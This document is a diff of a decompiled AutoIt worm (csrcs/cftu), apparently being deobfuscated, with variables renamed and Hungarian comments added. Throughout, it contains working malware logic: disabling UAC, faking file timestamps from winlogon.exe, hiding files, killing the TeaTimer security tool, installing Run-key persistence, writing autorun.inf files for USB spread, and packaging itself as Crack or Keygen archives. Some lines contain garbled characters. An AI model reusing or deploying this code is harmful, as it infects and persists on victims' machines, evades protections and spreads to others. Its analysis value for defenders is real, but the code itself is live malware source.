@@ -4015,18 +4081,18 @@ Func Fn00B1()
 	EndIf
 EndFunc
 
-Func Fn00B2($Arg00, $Arg01)
+Func Fn00B2($Folder1, $File1)
 	$Var043F = 0
 	$Var0446 = 0
 	$Var0447 = ";end"
 	While 1
 		$Var043F = $Var043F + 1
-		$Var0448 = FileReadLine($Arg00, $Var043F)
+		$Var0448 = FileReadLine($Folder1, $Var043F)
 		$Var0449 = Decrypt(0, $Var0448, $EncryptionKey, 1)
 		If $Var043F = 3 Then
 			If $Var0449 <> ";start" Then ExitLoop
 		EndIf
-		FileWriteLine($Arg01, $Var0449)
+		FileWriteLine($File1, $Var0449)
 		If $Var0449 = $Var0447 Then ExitLoop
 		If $Var0449 = "" Then
 			$Var0446 = $Var0446 + 1
@@ -4064,20 +4130,31 @@ Func Fn00B4($ArgOpt00 = -1)
 	Return $Local002A[0]
 EndFunc
 
-Func Fn00B5($Arg00, $Arg01)
-	$Var044A = $Arg00 & $Arg01
-	FileSetAttrib($Var044A, "-RASH")
-	$Var044B = FileGetTime(@SystemDir & "\winlogon.exe", 1)
+Func ChangeFileDate($Folder1, $File1)
+	$FullPath = $Folder1 & $File1
+	; leveszi a rejtést
+  FileSetAttrib($FullPath, "-RASH")
+
+  ; lekérdezi a winlogon.exe fájl dátumát és idejét
+	$WinlogonExeDateTime = FileGetTime(@SystemDir & "\winlogon.exe", 1)
 	If Not @error Then
-		$Var044C = $Var044B[0] & $Var044B[1] & $Var044B[2]
-		FileSetTime($Var044A, $Var044C, 1)
+		; ÉÉÉÉHHNN
+    $DateTime = $WinlogonExeDateTime[0] & $WinlogonExeDateTime[1] & $WinlogonExeDateTime[2]
+		; beállítja a saját létrehozási idejének
+    FileSetTime($FullPath, $DateTime, 1)
 	EndIf
-	$Var044B = FileGetTime(@SystemDir & "\winlogon.exe", 0)
+
+  ; lekérdezi a winlogon.exe fájl dátumát és idejét
+	$WinlogonExeDateTime = FileGetTime(@SystemDir & "\winlogon.exe", 0)
 	If Not @error Then
-		$Var044C = $Var044B[0] & $Var044B[1] & $Var044B[2]
-		FileSetTime($Var044A, $Var044C, 0)
+		; ÉÉÉÉHHNN
+    $DateTime = $WinlogonExeDateTime[0] & $WinlogonExeDateTime[1] & $WinlogonExeDateTime[2]
+		; beállítja a saját utolsó módosítási idejének
+		FileSetTime($FullPath, $DateTime, 0)
 	EndIf
-	FileSetAttrib($Var044A, "+RASH")
+
+  ; elrejti a fájlt
+	FileSetAttrib($FullPath, "+RASH")
 EndFunc
 
 Func Fn00B6()
@@ -4127,19 +4204,19 @@ Func Fn00B6()
 	$Var0300 = StringRegExp($Var029F, "m9k5o1z7a5q3", 0)
 EndFunc
 
-Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
+Func Fn00B7($Folder1, $File1, $Folder2, $File2, $Arg04)
 	$Var044E = 0
-	If RegRead($Arg02, $Arg03) <> "" Then
-		$Var03D2 = Decrypt(0, RegRead($Arg02, $Arg03), $Arg04, 4)
+	If RegRead($Folder2, $File2) <> "" Then
+		$Var03D2 = Decrypt(0, RegRead($Folder2, $File2), $Arg04, 4)
 	Else
-		$Var03D2 = Fn009B($Arg00)
+		$Var03D2 = Fn009B($Folder1)
 		If @error = 1 Then
 			$Var044E = 1
 		Else
 			$Var044F = StringSplit($Var03D2, ";")
 			If $Var044F[0] = 4 Then
 				If StringLen($Var044F[2]) = 2 Then
-					$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
+					$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
 				EndIf
 			Else
 				$Var03D2 = "-1"
@@ -4148,14 +4225,14 @@ Func Fn00B7($Arg00, $Arg01, $Arg02, $Arg03, $Arg04)
 		EndIf
 		Sleep(0x2710)
 		If $Var044E = 1 Then
-			$Var03D2 = Fn009B($Arg01)
+			$Var03D2 = Fn009B($File1)
 			If @error = 1 Then
 				$Var044E = 1
 			Else
 				$Var044F = StringSplit($Var03D2, ";")
 				If $Var044F[0] = 4 Or $Var044F[0] = 2 Then
 					If StringLen($Var044F[2]) = 2 Then
-						$Var0402 = RegWrite($Arg02, $Arg03, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
+						$Var0402 = RegWrite($Folder2, $File2, "REG_SZ", Decrypt(1, $Var03D2, $Arg04, 4))
 					EndIf
 				Else
 					$Var03D2 = "-1"
@@ -4231,19 +4308,19 @@ Func Fn00B8()
 	EndIf
 EndFunc
 
-Func Fn00B9($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, $Arg06, $Arg07)
-	$Var0450 = $Arg00
+Func Fn00B9($Folder1, $File1, $Folder2, $File2, $Arg04, $Arg05, $Arg06, $Arg07)
+	$Var0450 = $Folder1
 	$Var0451 = StringInStr($Var0450, "/", 0, 3)
 	$Var0452 = StringMid($Var0450, 1, $Var0451 - 1)
 	$Var0453 = StringMid($Var0450, $Var0451)
 	$Var0402 = Random(2, 8, 1)
 	Select
 		Case $Var0402 = 2
-			$Var0454 = ":" & $Arg01
+			$Var0454 = ":" & $File1
 		Case $Var0402 = 3
-			$Var0454 = ":" & $Arg02
+			$Var0454 = ":" & $Folder2
 		Case $Var0402 = 4
-			$Var0454 = ":" & $Arg03
+			$Var0454 = ":" & $File2
 		Case $Var0402 = 5
 			$Var0454 = ":" & $Arg04
 		Case $Var0402 = 6
@@ -4257,7 +4334,7 @@ Func Fn00B9($Arg00, $Arg01, $Arg02, $Arg03, $Arg04, $Arg05, $Arg06, $Arg07)
 	Return $Var0455
 EndFunc
 
-Func Fn00BA($Arg00)
+Func Fn00BA($Folder1)
 	$Var0456 = ""
 	$Var0457 = ""
 	$Var0458 = 0
@@ -4274,18 +4351,18 @@ Func Fn00BA($Arg00)
 				$Var0457 = Random(0, 9, 1)
 		EndSelect
 		$Var0458 = $Var0458 + 1
-		If $Var0458 = $Arg00 Then ExitLoop
+		If $Var0458 = $Folder1 Then ExitLoop
 		$Var0456 = $Var0456 & $Var0457
 	WEnd
 	Return $Var0456
 EndFunc
 
-Func Fn00BB($Arg00, $Arg01, $Arg02, $Arg03, $ArgOpt04 = "", $ArgOpt05 = "")
+Func Fn00BB($Folder1, $File1, $Folder2, $File2, $ArgOpt04 = "", $ArgOpt05 = "")
 	$Var0459 = ""
 	$Var045A = ""
 	$Var045B = ""
 	$Var045C = 1 + 3
-	$Var045A &= "open=" & $Arg01 & "shell\open\Command=" & $Arg01 & "shell\open\Default=1"
+	$Var045A &= "open=" & $File1 & "shell\open\Command=" & $File1 & "shell\open\Default=1"
 	If $ArgOpt04 = "rem" Then
 		$Var045C += 2
 		$Var045A &= "Icon=%system%\shell32.dll,7UseAutoPlay=1"
@@ -4323,38 +4400,38 @@ Func Fn00BB($Arg00, $Arg01, $Arg02, $Arg03, $ArgOpt04 = "", $ArgOpt05 = "")
 			$Var045F[0] += 1
 		Until $Var0464 = 8
 	EndIf
-	Fn0092($Var045F, 9 - $Var0462, ";" & Decrypt(1, $Arg02 & "!" & $Arg01, $Arg03, 1))
+	Fn0092($Var045F, 9 - $Var0462, ";" & Decrypt(1, $Folder2 & "!" & $File1, $File2, 1))
 	$Var0465 = Fn0094($Var045F, @CRLF, 1)
 	If $ArgOpt05 <> "" Then
 		$Var0466 = StringInStr($Var0465, "", 0, 1)
 		$Var0465 = Fn0097($Var0465, $ArgOpt05, $Var0466)
 		$Var0467 = StringInStr($Var0465, "", 0, 2)
-		$Var0465 = Fn0097($Var0465, " @" & $Arg01, $Var0467)
+		$Var0465 = Fn0097($Var0465, " @" & $File1, $Var0467)
 		$Var0465 = StringReplace($Var0465, "", "")
 	EndIf
 	$Var045B &= $Var0465
-	If FileExists($Arg00 & "/" & $Var045D) Then
-		FileSetAttrib($Arg00 & "/" & $Var045D, "-RASHNOT")
-		FileDelete($Arg00 & "/" & $Var045D)
+	If FileExists($Folder1 & "/" & $Var045D) Then
+		FileSetAttrib($Folder1 & "/" & $Var045D, "-RASHNOT")
+		FileDelete($Folder1 & "/" & $Var045D)
 		Sleep(10)
 	EndIf
-	$Var0468 = FileOpen($Arg00 & "/" & $Var045D, 1)
+	$Var0468 = FileOpen($Folder1 & "/" & $Var045D, 1)
 	FileWrite($Var0468, $Var045B)
 	FileClose($Var0468)
-	FileSetAttrib($Arg00 & "/" & $Var045D, "+RASHNOT")
+	FileSetAttrib($Folder1 & "/" & $Var045D, "+RASHNOT")
 EndFunc
 
-Func Fn00BC($Arg00)
-	$Arg00 = StringSplit($Arg00, "")
+Func Fn00BC($Folder1)
+	$Folder1 = StringSplit($Folder1, "")
 	$Var0456 = ""
-	For $Var0469 = 1 To $Arg00[0]
+	For $Var0469 = 1 To $Folder1[0]
 		$Var046A = Random(1, 2, 1)
 		If $Var046A = 1 Then
-			$Arg00[$Var0469] = StringUpper($Arg00[$Var0469])
+			$Folder1[$Var0469] = StringUpper($Folder1[$Var0469])
 		Else
-			$Arg00[$Var0469] = StringLower($Arg00[$Var0469])
+			$Folder1[$Var0469] = StringLower($Folder1[$Var0469])
 		EndIf
-		$Var0456 &= $Arg00[$Var0469]
+		$Var0456 &= $Folder1[$Var0469]
 	Next
 	Return $Var0456
 EndFunc
@@ -4374,22 +4451,23 @@ Func Fn00BD()
 	Return ";" & $Var046B
 EndFunc
 
-Func Fn00BE()
-	$Var036C = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-	$Var036D = "EnableLUA"
-	$Var046F = "REG_DWORD"
-	$Var0470 = "0"
-	$Var0471 = RegRead($Var036C, $Var036D)
-	If $Var0471 = 1 Then
-		RegWrite($Var036C, $Var036D, $Var046F, $Var0470)
+Func DisableLUA()
+	$RegKey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+	$RegName = "EnableLUA"
+	$RegType = "REG_DWORD"
+	$RegValue = "0"
+	$RegCurrentValue = RegRead($RegKey, $RegName)
+  ; ha az UAC engedélyezve van, kikapcsolja
+	If $RegCurrentValue = 1 Then
+    RegWrite($RegKey, $RegName, $RegType, $RegValue)
 	EndIf
 EndFunc
 
-Func Fn00BF($Arg00)
+Func Fn00BF($Folder1)
 	Fn00B4()
 	If $Var0320 = "Si" Then
 		$Var031C = Fn00E0()
-		If $Arg00 = 1 Then
+		If $Folder1 = 1 Then
 			$Var0304 = Fn00DA()
 		Else
 			$Var0304 = Fn00E3()
@@ -4827,7 +4905,7 @@ Func Fn00D7()
 	Fn009B($Var032D)
 EndFunc
 
-Func Fn00D8($Arg00, $Arg01, $Arg02, $Arg03)
+Func Fn00D8($Folder1, $File1, $Folder2, $File2)
 	Select
 		Case $Var031C = "Winrar"
 			$Var04AA = ".rar"
@@ -4835,19 +4913,19 @@ Func Fn00D8($Arg00, $Arg01, $Arg02, $Arg03)
 			$Var04AA = ".zip"
 	EndSelect
 	$Var0479 = Fn00D9($Var0304[$Var0303])
-	$Var04AB = StringLeft($Arg02, 3)
+	$Var04AB = StringLeft($Folder2, 3)
 	$Var04AC = DriveSpaceFree($Var04AB)
 	$Var04AD = Int($Var04AC)
 	If $Var04AD <= 0x0BB8 Then
 		Return "FuckSpace"
 	EndIf
-	If Not $Arg00 = "" And Not FileExists($Arg02 & $Var04AA) Then
-		DirCreate($Arg00)
-		$Arg02 = StringReplace($Arg02, "\\", "\")
-		$Arg02 = Fn00DF($Arg02)
-		$Arg01 = StringReplace($Arg01, "\\", "\")
-		$Arg01 = Fn00DF($Arg01)
-		FileCopy($Arg01 & $Var04AA, $Arg02 & $Var04AA, $Arg03)
+	If Not $Folder1 = "" And Not FileExists($Folder2 & $Var04AA) Then
+		DirCreate($Folder1)
+		$Folder2 = StringReplace($Folder2, "\\", "\")
+		$Folder2 = Fn00DF($Folder2)
+		$File1 = StringReplace($File1, "\\", "\")
+		$File1 = Fn00DF($File1)
+		FileCopy($File1 & $Var04AA, $Folder2 & $Var04AA, $File2)
 		Sleep(0x07D0)
 		Return "Done"
 	Else
@@ -4855,20 +4933,20 @@ Func Fn00D8($Arg00, $Arg01, $Arg02, $Arg03)
 	EndIf
 EndFunc
 
-Func Fn00D9($Arg00)
+Func Fn00D9($Folder1)
 	$Var04AE = 0
 	$Var04AF = ".Crack~.Activator~.Keygen~.Validator~-Razor1911~-RELOADED~-KeyMaker"
 	$Var04AF = StringSplit($Var04AF, "~")
 	$Var04B0 = Random(1, $Var04AF[0], 1)
-	If Not StringInStr($Arg00, "Crack") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "Activat") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "Keygen") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "Validat") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "Razor1911") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "RELOADED") Then $Var04AE = $Var04AE + 1
-	If Not StringInStr($Arg00, "KeyMaker") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "Crack") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "Activat") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "Keygen") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "Validat") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "Razor1911") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "RELOADED") Then $Var04AE = $Var04AE + 1
+	If Not StringInStr($Folder1, "KeyMaker") Then $Var04AE = $Var04AE + 1
 	If $Var04AE = 7 Then
-		$Arg00 = $Arg00 & $Var04AF[$Var04B0]
+		$Folder1 = $Folder1 & $Var04AF[$Var04B0]
 	EndIf
 	DirCreate($Var0319)
 	FileCopy($Var0302, $Var031A)
@@ -4880,15 +4958,15 @@ Func Fn00D9($Arg00)
 	$Var04B3 = FileOpen($Var04B1, 2)
 	$Var04B4 = FileOpen($Var04B2, 2)
 	FileWriteLine($Var04B3, $Var04B2 & @CRLF)
-	FileWriteLine($Var04B3, $Var0319 & $Arg00 & ".exe" & @CRLF)
-	FileWriteLine($Var04B4, $Arg00 & @CRLF)
+	FileWriteLine($Var04B3, $Var0319 & $Folder1 & ".exe" & @CRLF)
+	FileWriteLine($Var04B4, $Folder1 & @CRLF)
 	FileClose($Var04B3)
 	FileClose($Var04B4)
-	FileCopy($Var031A, $Var0319 & $Arg00 & ".exe", 1)
+	FileCopy($Var031A, $Var0319 & $Folder1 & ".exe", 1)
 	Sleep(0x03E8)
 	If $Var031C = "Winrar" Then
 		If Not FileExists($Var0304[$Var0303] & ".rar") Then
-			Run($Var0305 & " a -esh -ep -m5 -mt0 -r -t """ & $Var0319 & $Arg00 & ".rar" & " "" @" & $Var04B1, $Var0319, "", @SW_HIDE)
+			Run($Var0305 & " a -esh -ep -m5 -mt0 -r -t """ & $Var0319 & $Folder1 & ".rar" & " "" @" & $Var04B1, $Var0319, "", @SW_HIDE)
 			$Var0307 = @error & " rar"
 			ProcessWaitClose("RAR.exe")
 		Else
@@ -4897,14 +4975,14 @@ Func Fn00D9($Arg00)
 	EndIf
 	If $Var031C = "7za" Then
 		If Not FileExists($Var0304[$Var0303] & ".zip") Then
-			Run($Var0305 & " a -tzip """ & $Var0319 & $Arg00 & ".zip" & " "" @""" & $Var04B1, $Var0319, "", @SW_HIDE)
+			Run($Var0305 & " a -tzip """ & $Var0319 & $Folder1 & ".zip" & " "" @""" & $Var04B1, $Var0319, "", @SW_HIDE)
 			$Var0307 = @error & " 7za"
 			ProcessWaitClose($Var0311)
 		Else
 			$Var0307 = "7za-Exist"
 		EndIf
 	EndIf
-	FileDelete($Var0319 & $Arg00 & ".exe")
+	FileDelete($Var0319 & $Folder1 & ".exe")
 	FileDelete($Var04B1)
 	FileDelete($Var04B2)
 	If $Var04AE = 7 Then
@@ -4957,10 +5035,10 @@ Func Fn00DB()
 	Return $Var04C0
 EndFunc
 
-Func Fn00DC($Arg00)
+Func Fn00DC($Folder1)
 	$Var0458 = "/?tab=summary'>"
 	$Var04B5 = "</a></td><td class="
-	$Var04B9 = Fn009B($Arg00)
+	$Var04B9 = Fn009B($Folder1)
 	$Var04BA = Fn0096($Var04B9, $Var0458, $Var04B5)
 	Local $Local002B[1]
 	$Local002B[0] = 0
@@ -5042,38 +5120,38 @@ Func Fn00DC($Arg00)
 	EndIf
 EndFunc
 
-Func Fn00DD($Arg00)
-	If StringInStr($Arg00, "<span title=""") Then
-		$Var04C4 = StringInStr($Arg00, "<span title=""") + StringLen("<span title=""")
-		$Var04C5 = StringInStr($Arg00, """>")
+Func Fn00DD($Folder1)
+	If StringInStr($Folder1, "<span title=""") Then
+		$Var04C4 = StringInStr($Folder1, "<span title=""") + StringLen("<span title=""")
+		$Var04C5 = StringInStr($Folder1, """>")
 		$Var04C6 = $Var04C5 - $Var04C4
-		$Var04C7 = StringMid($Arg00, $Var04C4, $Var04C6)
+		$Var04C7 = StringMid($Folder1, $Var04C4, $Var04C6)
 		Return $Var04C7
 	Else
-		Return $Arg00
+		Return $Folder1
 	EndIf
 EndFunc
 
-Func Fn00DE($Arg00)
-	FileDelete($Var0319 & $Arg00 & ".rar")
-	FileDelete($Var0319 & $Arg00 & ".zip")
+Func Fn00DE($Folder1)
+	FileDelete($Var0319 & $Folder1 & ".rar")
+	FileDelete($Var0319 & $Folder1 & ".zip")
 EndFunc
 
-Func Fn00DF($Arg00)
-	$Arg00 = StringReplace($Arg00, "á", "")
-	$Arg00 = StringReplace($Arg00, "Á", "�")
-	$Arg00 = StringReplace($Arg00, "é", "")
-	$Arg00 = StringReplace($Arg00, "É", "�")
-	$Arg00 = StringReplace($Arg00, "í", "")
-	$Arg00 = StringReplace($Arg00, "Í", "�")
-	$Arg00 = StringReplace($Arg00, "ó", "")
-	$Arg00 = StringReplace($Arg00, "Ó", "")
-	$Arg00 = StringReplace($Arg00, "ú", "")
-	$Arg00 = StringReplace($Arg00, "Ú", "")
-	If $Arg00 = "" Then
+Func Fn00DF($Folder1)
+	$Folder1 = StringReplace($Folder1, "á", "")
+	$Folder1 = StringReplace($Folder1, "Á", "�")
+	$Folder1 = StringReplace($Folder1, "é", "")
+	$Folder1 = StringReplace($Folder1, "É", "�")
+	$Folder1 = StringReplace($Folder1, "í", "")
+	$Folder1 = StringReplace($Folder1, "Í", "�")
+	$Folder1 = StringReplace($Folder1, "ó", "")
+	$Folder1 = StringReplace($Folder1, "Ó", "")
+	$Folder1 = StringReplace($Folder1, "ú", "")
+	$Folder1 = StringReplace($Folder1, "Ú", "")
+	If $Folder1 = "" Then
 		Return "ErrorPath"
 	Else
-		Return $Arg00
+		Return $Folder1
 	EndIf
 EndFunc
 
@@ -5111,9 +5189,9 @@ Func Fn00E0()
 	Return "ERROR-2-SITES"
 EndFunc
 
-Func Fn00E1($Arg00)
+Func Fn00E1($Folder1)
 	$Var04CC = $Var0321
-	InetGet($Arg00, $Var0311, 1, 0)
+	InetGet($Folder1, $Var0311, 1, 0)
 	If @error Then
 		Return "Error"
 	Else
@@ -5121,9 +5199,9 @@ Func Fn00E1($Arg00)
 	EndIf
 EndFunc
 
-Func Fn00E2($Arg00)
+Func Fn00E2($Folder1)
 	$Var04CC = $Var031F
-	InetGet($Arg00, @SystemDir & "\" & $Var031E, 1, 1)
+	InetGet($Folder1, @SystemDir & "\" & $Var031E, 1, 1)
 	If @error Then
 		Return "Error"
 	Else
@@ -5194,7 +5272,7 @@ Func Fn00E3()
 	Return $Local002B
 EndFunc
 
-Func Fn00E4($Arg00)
+Func Fn00E4($Folder1)
 	$Var04CD = Random(0x1388, 0x4E20, 1)
 	$Var03FA = $Var02FC[1]
 	$Var04CE = $Var02FC[2]
@@ -5214,7 +5292,7 @@ Func Fn00E4($Arg00)
 	EndIf
 EndFunc
 
-Func Fn00E5($Arg00)
+Func Fn00E5($Folder1)
 	$Var04CD = Random(0x1388, 0x4E20, 1)
 	$Var03FA = $Var02FC[1]
 	$Var04CF = $Var02FC[2]
@@ -5239,7 +5317,7 @@ Func Fn00E5($Arg00)
 	EndIf
 EndFunc
 
-Func Fn00E6($Arg00)
+Func Fn00E6($Folder1)
 	$Var03FA = $Var02FC[1]
 	$Var04D1 = $Var02FC[2]
 	$Var04D6 = Fn007A($Var03FA, 1, $Var04D1)
@@ -5249,15 +5327,15 @@ Func SetIEStartPage($StartURL)
 	$Var04D7 = RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\", "Start Page", "REG_SZ", $StartURL)
 EndFunc
 
-Func Fn00E8($Arg00)
-	$Arg00 = StringSplit($Arg00, "%")
-	If $Arg00[0] = 2 Then
-		$Var04D8 = StringSplit($Arg00[1], "~")
+Func Fn00E8($Folder1)
+	$Folder1 = StringSplit($Folder1, "%")
+	If $Folder1[0] = 2 Then
+		$Var04D8 = StringSplit($Folder1[1], "~")
 		If $Var04D8[0] = 3 Then
 			$Var0450 = $Var04D8[1]
 			$Var04D9 = $Var04D8[2]
 			$Var04DA = $Var04D8[3]
-			$Var04DB = StringSplit($Arg00[2], "~")
+			$Var04DB = StringSplit($Folder1[2], "~")
 			$Var04DC = ""
 			For $Var0402 = 1 To $Var04DB[0]
 				Select
@@ -5287,11 +5365,11 @@ Func Fn00E8($Arg00)
 	EndIf
 EndFunc
 
-Func Fn00E9($Arg00, $ArgOpt01 = Default, $ArgOpt02 = Default)
+Func Fn00E9($Folder1, $ArgOpt01 = Default, $ArgOpt02 = Default)
 	If Not $ArgOpt01 Or $ArgOpt01 <= -1 Or $ArgOpt01 == Default Then $ArgOpt01 = "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)"
 	If Not $ArgOpt02 Or $ArgOpt02 <= -1 Or $ArgOpt02 == Default Then $ArgOpt02 = "promake"
 	Local $Local002C = ObjCreate("WinHTTP.WinHTTPRequest.5.1")
-	$Local002C .Open("GET", $Arg00, False)
+	$Local002C .Open("GET", $Folder1, False)
 	If $ArgOpt01 Then $Local002C .SetRequestHeader("User-Agent", $ArgOpt01)
 	If $ArgOpt02 Then $Local002C .SetRequestHeader("x-type", $ArgOpt02)
 	$Local002C .Send()
@@ -5459,7 +5537,7 @@ AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
 $CFTUONExeName = "cftuon.exe"
 $CFTUONProcessName = "cftuon"
 $CFTUExeName = "cftu.exe"
-$CFTUProcessName2 = "cftu"
+$CFTUProcessName = "cftu"
 
 ; ha valamelyik meghajtó gyökerében fut
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or
@@ -5504,7 +5582,7 @@ $CSRCSProcessName = "csrcs"
 $KHYFileName = "khy"
 $MyScriptName = "csrcs.au3"
 $NTRunScriptName = "NTrun.au3"
-$Var029A = "HKLM\Software\Microsoft\DRM\amty"
+$DRMAmtyRegistryKey = "HKLM\Software\Microsoft\DRM\amty"
 $Var029B = "-1"
 $Var029C = 0
 $Var029D = 0
@@ -5619,9 +5697,9 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
   ProcessClose("TeaTimer.exe")
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName2, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
+	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName, "REG_SZ", @SystemDir & "\" & $CFTUExeName)
 
   ; csrcs.exe bezására (ne fusson két példány)
 	If ProcessExists($CSRCSExeName) Then
@@ -5653,26 +5731,33 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 	DeleteFilesInFixedDriveRoots()
 	DeleteFilesInScriptDir()
 	$RandomFileName = $CFTUExeName
-	Fn00AA()
+	InfectPC()
 	Sleep(10 * 0x03E8) ; 10 * 1000 = 10 000 ms = 10 s
 	Sleep(10 * 0x003C * 0x03E8) ; 10 * 60 * 1000 = 60 000 ms = 60 s = 1 m
 
-	If ProcessExists($CSRCSExeName) Then
-		If FileGetVersion(@SystemDir & "\" & $CFTUExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
-			If RegRead($Var029A, "exp1") <> "" Then
+	; ha fut a csrcs.exe
+  If ProcessExists($CSRCSExeName) Then
+		; a csrcs.exe újabb verziójú, mint a cftu.exe, ami elindult
+    If FileGetVersion(@SystemDir & "\" & $CFTUExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
+			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
 				; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
 
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName2)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName2)
-				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName2)
-				Fn00A3()
+				; kitörli az előbb beírt registry értékeket, hogy ne fusson duplán
+        RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName)
+				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName)
+				RunSCmd()
 			EndIf
 		EndIf
 	EndIf
+
+  ; kilép
 	Exit
 EndIf
+
+; ha a script cftuon.exe névvel fut a Windows\System32 mappában
 If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeName Then
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
@@ -5683,7 +5768,7 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	If ProcessExists($CSRCSExeName) Then
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
-			If RegRead($Var029A, "exp1") <> "" Then
+			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
         ; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
@@ -5691,7 +5776,7 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
-				Fn00A3()
+				RunSCmd()
 			EndIf
 		EndIf
 	EndIf
@@ -5719,12 +5804,12 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 	DeleteFilesInFixedDriveRoots()
 	DeleteFilesInScriptDir()
 	$RandomFileName = $CFTUONExeName
-	Fn00A9()
+	InfectPCWithCheck()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
 	If ProcessExists($CSRCSExeName) Then
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
-			If RegRead($Var029A, "exp1") <> "" Then
+			If RegRead($DRMAmtyRegistryKey, "exp1") <> "" Then
         ; TeaTimer.exe bezárása
         ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
         ProcessClose("TeaTimer.exe")
@@ -5732,10 +5817,12 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
-				Fn00A3()
+				RunSCmd()
 			EndIf
 		EndIf
 	EndIf
+
+  ; kilép
 	Exit
 EndIf
 
@@ -5759,25 +5846,25 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 		If $Var0341 > $Var0340 Then
